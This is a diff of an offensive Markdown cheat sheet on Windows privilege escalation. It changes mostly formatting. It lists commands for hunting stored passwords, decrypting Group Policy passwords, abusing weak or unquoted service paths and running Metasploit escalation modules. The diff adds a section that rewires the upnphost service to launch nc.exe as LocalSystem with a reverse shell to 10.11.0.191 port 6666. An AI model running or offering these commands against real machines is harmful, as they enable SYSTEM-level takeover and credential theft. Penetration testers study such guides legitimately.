@@ -4,7 +4,7 @@ We now have a low-privileges shell that we want to escalate into a privileged sh
 
 ## Basic Enumeration of the System
 
-Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has.  
+Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has.
 
 ```
 # Basics
@@ -60,7 +60,7 @@ findstr /spin "password" *.*
 
 ### In Files
 
-These are common files to find them in. They might be base64-encoded. So look out for that. 
+These are common files to find them in. They might be base64-encoded. So look out for that.
 
 ```
 c:\sysprep.inf
@@ -94,7 +94,6 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-
 ## Internal/Hidden Services
 
 Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside.
@@ -104,6 +103,7 @@ netstat -ano
 ```
 
 Example output:
+
 ```
 Proto  Local address      Remote address     State        User  Inode  PID/Program name
     -----  -------------      --------------     -----        ----  -----  ----------------
@@ -121,7 +121,7 @@ Proto  Local address      Remote address     State        User  Inode  PID/Progr
     udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
 ```
 
-Look for **LISTENING/LISTEN**. Compare that to the scan you did from the outside.
+Look for **LISTENING/LISTEN**. Compare that to the scan you did from the outside.  
 Does it contain any ports that are not accessible from the outside?
 
 If that is the case, maybe you can make a remote forward to access it.
@@ -137,25 +137,24 @@ portfwd add -l 3306 -p 3306 -r 192.168.222
 
 So how should we interpret the netstat output?
 
-**Local address 0.0.0.0**
+**Local address 0.0.0.0**  
 Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.
 
-**Local address 127.0.0.1**
+**Local address 127.0.0.1**  
 Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. **This is interesting to us!**
 
-**Local address 192.168.1.9**
+**Local address 192.168.1.9**  
 Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. **This is also interesting to us!**
 
 ## Kernel exploits
 
-Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. 
+Just as in windows kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine.
 
 1. Step one - Identify the hotfixes/patches
 
 ```
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
-
 
 ### Python to Binary
 
@@ -176,6 +175,16 @@ Yeah I know this ain't pretty, but it works. You can of course change the name S
 ```
 cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ```
+
+## **Change the upnp service binary**
+`
+sc config upnphost binpath= "C:\Inetpub\nc.exe 10.11.0.191 6666 -e c:\Windows\system32\cmd.exe"`
+
+`sc config upnphost obj= ".\LocalSystem" password= ""`
+
+`sc config upnphost depend= ""`
+
+## 
 
 ## Weak Service Permissions
 
@@ -222,10 +231,9 @@ Now you can process them one by one with the cacls command.
 cacls "C:\path\to\file.exe"
 ```
 
-
 ### Look for Weakness
 
-What we are interested in is binaries that have been installed by the user. In the output you want to look for **BUILTIN\Users:(F)**. Or where your user/usergroup has **(F)** or **(C)** rights.
+What we are interested in is binaries that have been installed by the user. In the output you want to look for **BUILTIN\Users:\(F\)**. Or where your user/usergroup has **\(F\)** or **\(C\)** rights.
 
 Example:
 
@@ -234,7 +242,7 @@ C:\path\to\file.exe
 BUILTIN\Users:F
 BUILTIN\Power Users:C 
 BUILTIN\Administrators:F 
-NT AUTHORITY\SYSTEM:F 
+NT AUTHORITY\SYSTEM:F
 ```
 
 That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.
@@ -279,9 +287,9 @@ If your meterpreter session dies right after you get it you need migrate it to a
 wmic process list brief | find "winlogon"
 ```
 
-So when you get the shell you can either type **migrate PID** or automate this so that meterpreter automatically migrates.  
+So when you get the shell you can either type **migrate PID** or automate this so that meterpreter automatically migrates.
 
-http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html
+[http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html](http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html)
 
 ## Unquoted Service Paths
 
@@ -295,7 +303,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 sc query
 sc qc service name
 
-# Look for Binary_path_name and see if it is unquoted. 
+# Look for Binary_path_name and see if it is unquoted.
 ```
 
 If the path contains a space and is not quoted, the service is vulnerable.
@@ -316,10 +324,10 @@ c:\program.exe
 
 When the program is restarted it will execute the binary **program.exe**, which we of course control. We can do this in any directory that has a space in its name. Not only program files.
 
-This attack is explained here:
-http://toshellandback.com/2015/11/24/ms-priv-esc/
+This attack is explained here:  
+[http://toshellandback.com/2015/11/24/ms-priv-esc/](http://toshellandback.com/2015/11/24/ms-priv-esc/)
 
-There is also a metasploit module for this is: exploit/windows/local/trusted_service_path
+There is also a metasploit module for this is: exploit/windows/local/trusted\_service\_path
 
 ## Vulnerable Drivers
 
@@ -337,7 +345,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
 
-http://toshellandback.com/2015/11/24/ms-priv-esc/
+[http://toshellandback.com/2015/11/24/ms-priv-esc/](http://toshellandback.com/2015/11/24/ms-priv-esc/)
 
 ## Group Policy Preference
 
@@ -375,7 +383,6 @@ If we find the file with a password in it, we can decrypt it like this in Kali
 gpp-decrypt encryptedpassword
 ```
 
-
 ```
 Services\Services.xml: Element-Specific Attributes
 ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
@@ -383,7 +390,6 @@ Printers\Printers.xml: SharedPrinter Element
 Drives\Drives.xml: Element-Specific Attributes
 DataSources\DataSources.xml: Element-Specific Attributes
 ```
-
 
 ## Escalate to SYSTEM from Administrator
 
@@ -421,7 +427,6 @@ vdmallowed.exe
 vdmexploit.dll
 ```
 
-
 ## Using Metasploit
 
 So if you have a metasploit meterpreter session going you can run **getsystem**.
@@ -434,9 +439,8 @@ exploit/windows/local/trusted_service_path
 
 ### Post modules
 
-
-First you need to background the meterpreter shell and then you just run the post modules.
-You can also try some different post modules. 
+First you need to background the meterpreter shell and then you just run the post modules.  
+You can also try some different post modules.
 
 ```
 use exploit/windows/local/service_permissions
@@ -457,21 +461,20 @@ run post/windows/gather/enum_applications
 
 run post/windows/gather/enum_logged_on_users
 
-run post/windows/gather/checkvm 
+run post/windows/gather/checkvm
 ```
-
 
 ## References
 
+[http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/](http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/)  
+[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)  
+[https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)  
+[http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html)  
+[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)  
+[http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html](http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html)  
+[https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be](https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be)  
+[https://www.youtube.com/watch?v=PC\_iMqiuIRQ](https://www.youtube.com/watch?v=PC_iMqiuIRQ)  
+[http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/](http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)  
+[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)  
+[http://pwnwiki.io/\#!privesc/windows/index.md](http://pwnwiki.io/#!privesc/windows/index.md)
 
-http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/
-http://www.fuzzysecurity.com/tutorials/16.html
-https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
-http://it-ovid.blogspot.cl/2012/02/windows-privilege-escalation.html
-https://github.com/gentilkiwi/mimikatz
-http://bernardodamele.blogspot.cl/2011/12/dump-windows-password-hashes.html
-https://www.youtube.com/watch?v=kMG8IsCohHA&feature=youtu.be
-https://www.youtube.com/watch?v=PC_iMqiuIRQ
-http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
-https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
-http://pwnwiki.io/#!privesc/windows/index.md
